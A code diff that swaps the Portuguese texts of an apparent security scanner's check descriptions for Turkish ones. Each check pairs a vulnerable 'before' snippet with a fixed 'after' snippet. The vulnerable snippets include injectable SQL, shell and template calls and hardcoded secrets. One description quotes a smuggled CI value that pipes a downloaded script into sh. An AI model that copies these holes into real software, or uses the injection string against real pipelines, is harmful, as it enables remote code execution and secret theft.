@@ -4119,512 +4119,1020 @@ export const checkTranslations: Partial<Record<TranslatedCheckLang, Record<strin
     },
   },
 },
-  pt: {
+  tr: {
   "supabase-service-role-in-client": {
-    title: "A chave secreta do Supabase acaba numa parte exposta ao navegador",
+    title: "Supabase'in gizli anahtarı tarayıcıya açık bir dosyada bulunuyor",
     description:
-      "Uma variável com prefixo público (ex. NEXT_PUBLIC_, VITE_) ou um ficheiro do lado do cliente referencia a service role key do Supabase. Esta chave contorna a Row Level Security: se acabar no bundle do navegador, qualquer pessoa pode lê-la e agir como administrador da base de dados.",
+      "Genel bir önekle (örn. NEXT_PUBLIC_, VITE_) tanımlanmış bir değişken veya istemci tarafı bir dosya, Supabase'in service role key'ine referans veriyor. Bu anahtar Row Level Security'yi atlar: tarayıcı paketine girerse, herkes onu okuyup veritabanı yöneticisi gibi davranabilir.",
     fix: {
       before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
-      after: `// app/api/admin/route.ts (apenas servidor)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
+      after: `// app/api/admin/route.ts (yalnızca sunucu)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
     },
   },
   "hardcoded-secret": {
-    title: "Há palavras-passe ou chaves secretas escritas diretamente no código",
+    title: "Kodun içinde doğrudan yazılmış şifreler veya gizli anahtarlar var",
     description:
-      "Uma chave API, um token ou uma palavra-passe parecem escritos como valor literal em vez de lidos a partir de uma variável de ambiente. Quem ler o código-fonte (ou o repositório, se for público) obtém esse segredo.",
+      "Bir API anahtarı, token veya şifre, bir ortam değişkeninden okunmak yerine kodun içine sabit bir değer olarak yazılmış görünüyor. Kaynak kodu okuyan herkes (veya depo herkese açıksa herkes) bu sırrı ele geçirir.",
     fix: {
       before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
       after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
     },
   },
   "env-file-with-real-values": {
-    title: "Um ficheiro com as palavras-passe reais do projeto está entre os analisados",
+    title: "Projenin gerçek şifrelerini içeren bir dosya analiz edilenler arasında",
     description:
-      "Um ficheiro .env com valores reais (não um .env.example) está incluído na análise. Se este ficheiro acabar num repositório ou num deploy público, todas as credenciais que contém ficam expostas.",
+      "Gerçek değerler içeren bir .env dosyası (bir .env.example değil) analize dahil edilmiş. Bu dosya bir depoya veya herkese açık bir dağıtıma girerse, içerdiği tüm kimlik bilgileri açığa çıkar.",
     fix: {
-      before: `# .env (submetido por engano)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
-      after: `# .env.example (submetido)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# o .env fica fora do repositório (.gitignore)`,
+      before: `# .env (yanlışlıkla commit edilmiş)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
+      after: `# .env.example (commit edilen)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env depo dışında kalır (.gitignore)`,
     },
   },
   "missing-row-level-security": {
-    title: "Qualquer pessoa pode ler ou modificar os dados de todos os utilizadores",
+    title: "Herkes tüm kullanıcıların verilerini okuyabilir veya değiştirebilir",
     description:
-      "A Row Level Security está desativada, ou uma policy permite o acesso a qualquer pessoa (USING (true)) sem verificar quem está a fazer o pedido. Qualquer utilizador autenticado — ou até anónimo — pode ler ou modificar os dados de todos os outros.",
+      "Row Level Security devre dışı, ya da bir politika isteği kimin yaptığını kontrol etmeden herkese erişim izni veriyor (USING (true)). Her kimliği doğrulanmış kullanıcı — hatta anonim biri bile — başkalarının verilerini okuyabilir veya değiştirebilir.",
     fix: {
       before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
       after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
     },
   },
   "sql-injection": {
-    title: "Um valor introduzido pelo utilizador é colado diretamente numa consulta à base de dados",
+    title: "Kullanıcının girdiği bir değer doğrudan bir veritabanı sorgusuna yapıştırılıyor",
     description:
-      "Uma consulta SQL é construída concatenando ou interpolando diretamente uma string em vez de usar parâmetros. Se esse texto vier (mesmo que indiretamente) de um utilizador, pode alterar a própria consulta — injeção SQL.",
+      "Bir SQL sorgusu, parametre kullanmak yerine bir metni doğrudan birleştirerek veya enterpolasyonla oluşturuluyor. Bu metin (dolaylı yoldan da olsa) bir kullanıcıdan geliyorsa, sorgunun kendisini değiştirebilir — SQL injection.",
     fix: {
       before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
       after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
     },
   },
   "plaintext-password-storage": {
-    title: "As palavras-passe não parecem estar protegidas",
+    title: "Şifreler korunmuyor gibi görünüyor",
     description:
-      "Um campo de palavra-passe é guardado exatamente como chegou no pedido, e nenhuma função de hashing (bcrypt, argon2, scrypt) aparece no ficheiro. Se a base de dados for comprometida, todas as palavras-passe ficam imediatamente utilizáveis.",
+      "Bir şifre alanı, istekte geldiği haliyle kaydediliyor ve dosyada hiçbir hashleme fonksiyonu (bcrypt, argon2, scrypt) görünmüyor. Veritabanı ele geçirilirse, her şifre anında kullanılabilir hale gelir.",
     fix: {
       before: `await db.users.insert({ email, password: req.body.password })`,
       after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
     },
   },
   "hardcoded-jwt-secret": {
-    title: "O segredo usado para assinar os logins está escrito em texto simples no código",
+    title: "Girişleri imzalamak için kullanılan gizli anahtar kodun içinde açık metin olarak yazılı",
     description:
-      "O segredo passado a jwt.sign / jwt.verify (ou a variável JWT_SECRET) é um valor literal no código em vez de vir de uma variável de ambiente. Quem o ler pode criar tokens de acesso válidos para qualquer utilizador.",
+      "jwt.sign / jwt.verify'a geçirilen gizli anahtar (veya JWT_SECRET değişkeni), bir ortam değişkeninden gelmek yerine kodun içinde sabit bir değer. Bunu okuyan herkes herhangi bir kullanıcı için geçerli erişim tokenları oluşturabilir.",
     fix: {
       before: `jwt.sign(payload, "super-secret-key-123")`,
       after: `jwt.sign(payload, process.env.JWT_SECRET)`,
     },
   },
   "command-injection": {
-    title: "O servidor pode ser forçado a executar comandos externos",
+    title: "Sunucu dışarıdan komut çalıştırmaya zorlanabilir",
     description:
-      "Uma função que executa comandos de sistema (exec, execSync, spawn) recebe uma string construída por interpolação ou concatenação. Se parte dessa string vier de uma entrada do utilizador, quem a controlar pode executar comandos arbitrários no servidor.",
+      "Sistem komutları çalıştıran bir fonksiyon (exec, execSync, spawn), enterpolasyon veya birleştirmeyle oluşturulmuş bir metin alıyor. Bu metnin bir kısmı kullanıcı girdisinden geliyorsa, onu kontrol eden kişi sunucuda istediği komutu çalıştırabilir.",
     fix: {
       before: "execSync(`convert ${filename} output.png`)",
       after: `execFile("convert", [filename, "output.png"])`,
     },
   },
   "unprotected-new-table": {
-    title: "Uma nova tabela parece ser criada sem proteção",
+    title: "Yeni bir tablo korumasız oluşturulmuş görünüyor",
     description:
-      "Uma migração SQL cria uma tabela mas não ativa a Row Level Security para essa mesma tabela no mesmo ficheiro. Enquanto assim permanecer, a tabela começa sem nenhuma restrição sobre quem a pode ler ou escrever.",
+      "Bir SQL migration'ı bir tablo oluşturuyor ama aynı dosyada bu tablo için Row Level Security'yi etkinleştirmiyor. Bu böyle kaldığı sürece, tablo kimin okuyup yazabileceğine dair hiçbir kısıtlama olmadan başlar.",
     fix: {
       before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
       after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
     },
   },
   "permissive-cors": {
-    title: "O site aceita pedidos de qualquer outro site",
+    title: "Site başka herhangi bir web sitesinden gelen istekleri kabul ediyor",
     description:
-      "O cabeçalho CORS está configurado para aceitar pedidos de qualquer origem (*), ou o middleware cors() é usado sem restrições. Qualquer site de terceiros pode chamar as suas APIs a partir do navegador de um utilizador já autenticado.",
+      "CORS başlığı herhangi bir kaynaktan (*) gelen istekleri kabul edecek şekilde ayarlanmış, ya da cors() middleware'i kısıtlama olmadan kullanılıyor. Üçüncü taraf herhangi bir web sitesi, zaten kimliği doğrulanmış bir kullanıcının tarayıcısından API'lerinizi çağırabilir.",
     fix: {
       before: `app.use(cors())`,
       after: `app.use(cors({ origin: ["https://yoursite.com"] }))`,
     },
   },
   "admin-function-missing-auth": {
-    title: "Uma função com permissões de administrador não verifica quem a está a usar",
+    title: "Yönetici izinlerine sahip bir fonksiyon kimin kullandığını kontrol etmiyor",
     description:
-      "Uma rota ou função cujo nome sugere operações de administração não contém, nas linhas próximas, nenhuma verificação de autenticação ou de papel (role). Qualquer pessoa que conheça o URL poderia executá-la.",
+      "Adı yönetici işlemlerini düşündüren bir route veya fonksiyon, yakın satırlarda hiçbir kimlik doğrulama veya rol kontrolü içermiyor. URL'yi bilen herkes onu çalıştırabilir.",
     fix: {
       before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
       after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
     },
   },
   ssrf: {
-    title: "O site pode ser forçado a executar código externo",
+    title: "Site dışarıdan kod çalıştırmaya zorlanabilir",
     description:
-      "Um pedido HTTP de saída (fetch, axios) usa diretamente um valor vindo do pedido de um utilizador como URL de destino. Um utilizador malicioso pode fazer o seu servidor chamar endereços internos ou arbitrários — Server-Side Request Forgery.",
+      "Giden bir HTTP isteği (fetch, axios), hedef URL olarak doğrudan bir kullanıcının isteğinden gelen bir değer kullanıyor. Kötü niyetli bir kullanıcı, sunucunuzun dahili veya rastgele adreslere istek göndermesini sağlayabilir — Server-Side Request Forgery.",
     fix: {
       before: `const data = await fetch(req.query.url)`,
       after: `const ALLOWED = new Set(["https://api.yourservice.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("URL not allowed")\nconst data = await fetch(req.query.url)`,
     },
   },
   "weak-password-hashing": {
-    title: "As palavras-passe são protegidas com um método hoje fácil de quebrar",
+    title: "Şifreler artık kolayca kırılabilen bir yöntemle korunuyor",
     description:
-      "Na mesma linha, md5() ou sha1() são aplicados a um valor ligado a uma palavra-passe. Estes algoritmos são rápidos demais de calcular: um atacante com a base de dados pode tentar milhares de milhões de palavras-passe por segundo.",
+      "Aynı satırda md5() veya sha1(), bir şifreyle ilişkili bir değere uygulanıyor. Bu algoritmalar hesaplamak için çok hızlı: veritabanına sahip bir saldırgan saniyede milyarlarca şifre deneyebilir.",
     fix: {
       before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
       after: `const hashed = await bcrypt.hash(password, 12)`,
     },
   },
   "xss-dangerous-html": {
-    title: "Texto escrito pelos utilizadores pode executar código no navegador",
+    title: "Kullanıcıların yazdığı metin tarayıcıda kod çalıştırabilir",
     description:
-      "Conteúdo é inserido na página como HTML em bruto (dangerouslySetInnerHTML, v-html, .innerHTML) em vez de texto simples. Se esse conteúdo incluir entrada do utilizador, pode conter scripts que correm no navegador de quem ler a página.",
+      "İçerik, düz metin yerine ham HTML olarak sayfaya ekleniyor (dangerouslySetInnerHTML, v-html, .innerHTML). Bu içerik kullanıcı girdisi içeriyorsa, sayfayı okuyan kişinin tarayıcısında çalışan script'ler barındırabilir.",
     fix: {
       before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
-      after: `<div>{comment.text}</div>\n// ou, se for necessário HTML: DOMPurify.sanitize(comment.text)`,
+      after: `<div>{comment.text}</div>\n// veya, HTML gerekiyorsa: DOMPurify.sanitize(comment.text)`,
     },
   },
   "public-storage-bucket": {
-    title: "O espaço para ficheiros enviados é visível por qualquer pessoa",
+    title: "Yüklenen dosyaların bulunduğu alan herkese açık",
     description:
-      "Um bucket de armazenamento (Supabase Storage, S3) está configurado como público. Se contiver documentos, fotos ou ficheiros enviados por utilizadores, qualquer pessoa que conheça — ou adivinhe — o caminho pode aceder-lhes sem autenticação.",
+      "Bir storage bucket (Supabase Storage, S3) herkese açık olarak yapılandırılmış. İçinde kullanıcılar tarafından yüklenen belgeler, fotoğraflar veya dosyalar varsa, yolu bilen — veya tahmin eden — herkes kimlik doğrulaması olmadan onlara erişebilir.",
     fix: {
       before: `supabase.storage.createBucket("uploads", { public: true })`,
-      after: `supabase.storage.createBucket("uploads", { public: false })\n// sirva os ficheiros com URLs assinados de duração limitada: createSignedUrl(path, 60)`,
+      after: `supabase.storage.createBucket("uploads", { public: false })\n// dosyaları süreli imzalı URL'lerle sunun: createSignedUrl(path, 60)`,
     },
   },
   "csrf-state-changing-get": {
-    title: "Um único link é suficiente para apagar ou alterar dados",
+    title: "Veriyi silmek veya değiştirmek için tek bir link yeterli",
     description:
-      "Uma rota GET executa uma operação que altera dados (o caminho contém delete/remove/update/edit). Os pedidos GET correm apenas ao visitar um link ou ao carregar uma imagem de um site externo — o ponto de partida clássico de um ataque CSRF.",
+      "Bir GET route'u veriyi değiştiren bir işlem yapıyor (yol delete/remove/update/edit içeriyor). GET istekleri sadece bir linki ziyaret etmek veya harici bir siteden bir görsel yüklemekle çalışır — klasik bir CSRF saldırısının basamak taşı.",
     fix: {
       before: `router.get("/posts/:id/delete", deletePost)`,
       after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
     },
   },
   "insecure-token-storage": {
-    title: "Os dados de login guardados no navegador não estão bem protegidos",
+    title: "Tarayıcıda kaydedilen giriş verileri iyi korunmuyor",
     description:
-      "Um token de acesso é guardado em localStorage. Ao contrário de um cookie httpOnly, qualquer script a correr na página (incluindo um malicioso injetado via XSS) pode lê-lo e roubá-lo.",
+      "Bir erişim tokeni localStorage'a kaydediliyor. httpOnly bir çerezin aksine, sayfada çalışan herhangi bir script (XSS ile enjekte edilmiş kötü niyetli bir script dahil) bunu okuyup çalabilir.",
     fix: {
       before: `localStorage.setItem("authToken", token)`,
-      after: `// definir o token como um cookie httpOnly a partir do servidor:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
+      after: `// tokeni sunucudan httpOnly bir çerez olarak ayarlayın:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
     },
   },
   "open-redirect": {
-    title: "O site pode ser usado para redirecionar para um site fraudulento",
+    title: "Site sahte bir web sitesine yönlendirmek için kullanılabilir",
     description:
-      "O site redireciona o utilizador para um endereço retirado diretamente do pedido (query, body, params) sem verificar que é um domínio conhecido. Um link que parece apontar para o seu site pode na realidade levar a uma página de phishing.",
+      "Site, kullanıcıyı bilinen bir domain olup olmadığını kontrol etmeden doğrudan istekten alınan bir adrese (query, body, params) yönlendiriyor. Sitenize gidiyormuş gibi görünen bir link aslında bir phishing sayfasına çıkabilir.",
     fix: {
       before: `res.redirect(req.query.next)`,
       after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
     },
   },
   idor: {
-    title: "Mudar um número no endereço pode mostrar os dados de outra pessoa",
+    title: "Adresteki bir sayıyı değiştirmek başkasının verisini gösterebilir",
     description:
-      "Uma consulta à base de dados usa diretamente um identificador retirado do URL (req.params.id) sem verificar, nas linhas próximas, que pertence ao utilizador que faz o pedido. Mudar o id no endereço pode dar acesso aos dados de outro utilizador — Insecure Direct Object Reference.",
+      "Bir veritabanı sorgusu, yakın satırlarda isteği yapan kullanıcıya ait olduğunu kontrol etmeden URL'den alınan bir tanımlayıcıyı (req.params.id) doğrudan kullanıyor. Adresteki id'yi değiştirmek başka bir kullanıcının verisine erişim sağlayabilir — Insecure Direct Object Reference.",
     fix: {
       before: `const order = await Order.findById(req.params.id)`,
       after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
     },
   },
   "no-login-rate-limit": {
-    title: "O formulário de login não bloqueia demasiadas tentativas seguidas",
+    title: "Giriş formu art arda çok fazla denemeyi engellemiyor",
     description:
-      "Uma rota de login está definida no ficheiro, mas não há nenhum sinal de middleware de rate-limiting no mesmo ficheiro. Sem um limite de tentativas, um atacante pode tentar palavras-passe em sequência (força bruta) sem ser travado.",
+      "Dosyada bir giriş route'u tanımlanmış, ama aynı dosyada rate-limiting middleware'inden hiçbir iz yok. Deneme sınırı olmadan, bir saldırgan şifreleri sırayla deneyebilir (brute force) ve hiçbir şey onu yavaşlatmaz.",
     fix: {
       before: `router.post("/login", loginHandler)`,
       after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
     },
   },
   "sensitive-data-in-logs": {
-    title: "Palavras-passe ou dados sensíveis acabam nos logs",
+    title: "Şifreler veya hassas veriler loglara karışıyor",
     description:
-      "Uma chamada a console.log (ou semelhante) inclui uma variável chamada password, token, secret ou apiKey. Se estes logs acabarem num serviço externo ou num ficheiro, os dados sensíveis ficam expostos muito mais tempo do que o necessário.",
+      "console.log (veya benzeri) çağrısı password, token, secret veya apiKey adında bir değişken içeriyor. Bu loglar harici bir servise veya bir dosyaya girerse, hassas veriler gereğinden çok daha uzun süre açıkta kalır.",
     fix: {
       before: `console.log("login attempt", { email, password })`,
       after: `console.log("login attempt", { email })`,
     },
   },
   "path-traversal": {
-    title: "Um ficheiro no servidor pode ser lido ou escrito escolhendo o caminho a partir do exterior",
+    title: "Sunucudaki bir dosya, dışarıdan belirlenen bir yol seçilerek okunabilir veya yazılabilir",
     description:
-      "Uma função que lê, escreve ou envia um ficheiro recebe o caminho diretamente de um valor do pedido (query, body, params) sem verificar que fica dentro de uma pasta permitida. Um atacante pode inserir \"../\" para sair da pasta prevista e ler ou sobrescrever ficheiros arbitrários no servidor (ex. um ficheiro de configuração com credenciais).",
+      "Bir dosyayı okuyan, yazan veya gönderen bir fonksiyon, izin verilen bir klasörün içinde kaldığını kontrol etmeden yolu doğrudan bir istek değerinden (query, body, params) alıyor. Bir saldırgan, beklenen klasörden çıkıp sunucudaki rastgele dosyaları okumak veya üzerine yazmak için \"../\" ekleyebilir (örn. kimlik bilgileri içeren bir yapılandırma dosyası).",
     fix: {
       before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
-      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("Caminho não permitido")\n  res.sendFile(target)\n})`,
+      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("İzin verilmeyen yol")\n  res.sendFile(target)\n})`,
     },
   },
   "nosql-injection": {
-    title: "Um valor introduzido pelo utilizador é executado como código dentro de uma consulta MongoDB",
+    title: "Kullanıcının girdiği bir değer bir MongoDB sorgusu içinde kod olarak çalıştırılıyor",
     description:
-      "O operador $where do MongoDB executa JavaScript do lado do servidor para cada documento — se essa string for construída concatenando um valor vindo do utilizador, quem a controlar pode fazer executar código arbitrário no contexto da base de dados, não apenas alterar o filtro como numa injeção SQL normal.",
+      "MongoDB'nin $where operatörü her döküman için sunucu tarafında JavaScript çalıştırır — bu metin kullanıcıdan gelen bir değer birleştirilerek oluşturuluyorsa, onu kontrol eden kişi veritabanının bağlamında rastgele kod çalıştırabilir, normal bir SQL injection'da olduğu gibi sadece filtreyi değiştirmekle kalmaz.",
     fix: {
       before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
       after: `db.collection.find({ username: username })`,
     },
   },
   ssti: {
-    title: "Um valor introduzido pelo utilizador é interpretado como um template, não como dado",
+    title: "Kullanıcının girdiği bir değer veri olarak değil, bir template olarak yorumlanıyor",
     description:
-      "Uma função que compila/executa um template recebe o template INTEIRO a partir de um valor do pedido, em vez de usar um template fixo e passar só os dados. Um atacante pode escrever diretamente na sintaxe do motor de templates (ex. {{7*7}} para Jinja2) e executar código no servidor — Server-Side Template Injection, que muitas vezes leva à execução de comandos arbitrários, não apenas a um problema de visualização como o XSS.",
+      "Bir template'i derleyen/çalıştıran fonksiyon, sabit bir template kullanıp sadece veriyi geçirmek yerine, TÜM template'i bir istek değerinden alıyor. Bir saldırgan doğrudan template motorunun söz dizimiyle yazabilir (örn. Jinja2 için {{7*7}}) ve sunucuda kod çalıştırabilir — Server-Side Template Injection, genellikle XSS gibi sadece bir görüntüleme sorunu değil, rastgele komut çalıştırmaya kadar gider.",
     fix: {
       before: `return render_template_string(request.args.get("name"))`,
       after: `return render_template("profile.html", name=request.args.get("name"))`,
     },
   },
   xxe: {
-    title: "O parser XML pode ser forçado a ler ficheiros ou fazer pedidos externos",
+    title: "XML ayrıştırıcı dosya okumaya veya dışarıya istek yapmaya zorlanabilir",
     description:
-      "Um parser XML (DocumentBuilderFactory) é criado sem desativar explicitamente as entidades externas (DOCTYPE) nas linhas próximas. Se o parser receber XML de uma fonte não confiável, um atacante pode definir uma entidade externa para ler ficheiros no servidor ou fazê-lo contactar um endereço à sua escolha — XML External Entity.",
+      "Bir XML ayrıştırıcı (DocumentBuilderFactory), yakın satırlarda harici varlıkları (DOCTYPE) açıkça devre dışı bırakmadan oluşturuluyor. Ayrıştırıcı güvenilmeyen bir kaynaktan XML alırsa, bir saldırgan sunucudaki dosyaları okumak veya seçtiği bir adrese istek yaptırmak için harici bir varlık tanımlayabilir — XML External Entity.",
     fix: {
       before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
       after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
     },
   },
   "terraform-open-security-group": {
-    title: "Um security group do Terraform abre uma porta sensível a toda a internet",
+    title: "Bir Terraform security group'u hassas bir portu tüm internete açıyor",
     description:
-      "Uma regra com \"cidr_blocks\" que inclui 0.0.0.0/0 (qualquer endereço IP) está próxima de uma porta sensível — SSH (22), RDP (3389), ou uma porta típica de base de dados (MySQL, Postgres, MongoDB, Redis, SQL Server). Qualquer pessoa na internet pode tentar ligar-se a esse serviço, não só quem deveria.",
+      "0.0.0.0/0 (herhangi bir IP adresi) içeren \"cidr_blocks\" olan bir kural, hassas bir portun yakınında — SSH (22), RDP (3389) veya tipik bir veritabanı portu (MySQL, Postgres, MongoDB, Redis, SQL Server). İnternetteki herkes o servise bağlanmayı deneyebilir, sadece olması gerekenler değil.",
     fix: {
       before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
-      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # apenas a sua rede privada, ou um bastion host\n}`,
+      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # yalnızca özel ağınız, ya da bir bastion host\n}`,
     },
   },
   "gcp-firewall-open-to-internet": {
-    title: "Uma regra de firewall do Google Cloud abre uma porta sensível a toda a internet",
+    title: "Bir Google Cloud firewall kuralı hassas bir portu tüm internete açıyor",
     description:
-      "Um recurso \"google_compute_firewall\" com \"source_ranges\" que inclui 0.0.0.0/0 (qualquer endereço IP) permite tráfego para uma porta sensível — SSH (22), RDP (3389), ou uma porta típica de base de dados (MySQL, Postgres, MongoDB, Redis, SQL Server). Qualquer pessoa na internet pode tentar ligar-se a esse serviço, não só quem deveria.",
+      "0.0.0.0/0 (herhangi bir IP adresi) içeren \"source_ranges\" olan bir \"google_compute_firewall\" kaynağı, hassas bir porta — SSH (22), RDP (3389) veya tipik bir veritabanı portu (MySQL, Postgres, MongoDB, Redis, SQL Server) — trafiğe izin veriyor. İnternetteki herkes o servise bağlanmayı deneyebilir, sadece olması gerekenler değil.",
     fix: {
       before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
-      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # apenas a sua rede privada, ou um bastion host\n}`,
+      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # yalnızca özel ağınız, ya da bir bastion host\n}`,
     },
   },
   "azure-nsg-open-to-internet": {
-    title: "Uma regra de rede do Azure abre uma porta sensível a toda a internet",
+    title: "Bir Azure ağ kuralı hassas bir portu tüm internete açıyor",
     description:
-      "Uma regra de segurança de rede (\"azurerm_network_security_rule\", ou um bloco \"security_rule\" dentro de \"azurerm_network_security_group\") com \"source_address_prefix\" a \"*\" ou \"0.0.0.0/0\", direção \"Inbound\" e acesso \"Allow\", próxima de uma porta sensível — SSH (22), RDP (3389), ou uma porta típica de base de dados. Qualquer pessoa na internet pode tentar ligar-se a esse serviço, não só quem deveria.",
+      "\"source_address_prefix\" değeri \"*\" veya \"0.0.0.0/0\" olan, yönü \"Inbound\" ve erişimi \"Allow\" olan bir ağ güvenlik kuralı (\"azurerm_network_security_rule\", ya da \"azurerm_network_security_group\" içinde bir \"security_rule\" bloğu), hassas bir portun yakınında — SSH (22), RDP (3389) veya tipik bir veritabanı portu. İnternetteki herkes o servise bağlanmayı deneyebilir, sadece olması gerekenler değil.",
     fix: {
       before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
-      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # apenas a sua rede privada, ou um bastion host\n}`,
+      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # yalnızca özel ağınız, ya da bir bastion host\n}`,
     },
   },
   "terraform-hardcoded-secret": {
-    title: "Um segredo é escrito como valor por omissão de uma variável Terraform",
+    title: "Bir Terraform değişkeninin varsayılan değeri olarak bir sır yazılmış",
     description:
-      "Uma variável com um nome do tipo password/secret/token/key tem um valor literal no seu \"default\". Ao contrário de um valor passado em tempo de execução (tfvars, variáveis de ambiente TF_VAR_*), um valor por omissão acaba no código-fonte — e se o repositório for partilhado ou público, qualquer pessoa o vê, mesmo sem acesso ao estado do Terraform.",
+      "password/secret/token/key gibi bir isme sahip değişkenin \"default\"ında sabit bir değer var. Çalışma zamanında geçirilen bir değerin aksine (tfvars, TF_VAR_* ortam değişkenleri), bir default kaynak kodunun içinde kalır — ve depo paylaşılıyor veya herkese açıksa, Terraform state'ine erişimi olmayan biri bile onu görebilir.",
     fix: {
       before: `variable "db_password" {\n  default = "supersecret123"\n}`,
-      after: `variable "db_password" {\n  # sem valor por omissão: deve ser passado com um ficheiro .tfvars (fora do git) ou uma variável de ambiente TF_VAR_db_password\n  sensitive = true\n}`,
+      after: `variable "db_password" {\n  # varsayılan değer yok: bir .tfvars dosyasıyla (git dışında) veya bir TF_VAR_db_password ortam değişkeniyle geçirilmeli\n  sensitive = true\n}`,
     },
   },
   "gha-script-injection": {
-    title: "Um valor controlado por um utilizador externo entra diretamente num comando shell da CI",
+    title: "Harici bir kullanıcının kontrol ettiği bir değer doğrudan bir CI shell komutuna giriyor",
     description:
-      'Um comando "run:" de um workflow do GitHub Actions interpola diretamente um valor como o título de uma pull request, o nome de um branch ou o texto de um comentário — todos escrevíveis por qualquer pessoa que abra uma pull request ou um comentário, mesmo a partir de um fork externo. Um valor como `"; curl malware.sh | sh #` executaria comandos arbitrários na CI, com acesso a todos os segredos disponíveis nesse workflow.',
+      'Bir GitHub Actions workflow\'undaki "run:" komutu, pull request başlığı, bir branch adı veya bir yorumun metni gibi bir değeri doğrudan enterpolasyonla kullanıyor — bunların hepsi, harici bir fork\'tan bile olsa bir pull request veya yorum açan herkes tarafından yazılabilir. `"; curl malware.sh | sh #` gibi bir değer, o workflow\'da bulunan her sırra erişimle CI\'da rastgele komutlar çalıştırır.',
     fix: {
       before: `- run: echo "\${{ github.event.pull_request.title }}"`,
-      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # passado como variável de ambiente, nunca interpolado diretamente no comando`,
+      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # bir ortam değişkeni olarak geçirildi, hiçbir zaman doğrudan komuta enterpole edilmedi`,
     },
   },
   "gha-pull-request-target-checkout": {
-    title: "O workflow executa o código de uma pull request externa com acesso aos segredos do repositório",
+    title: "Workflow, depo sırlarına erişimle harici bir pull request'in kodunu çalıştırıyor",
     description:
-      'O workflow usa "pull_request_target" — que corre com as permissões e os segredos do repositório base mesmo para uma pull request aberta a partir de um fork externo — e faz checkout do próprio código da pull request ("github.event.pull_request.head"), não do branch base. Quem abre a pull request obtém, na prática, a execução do seu próprio código com acesso a esses segredos.',
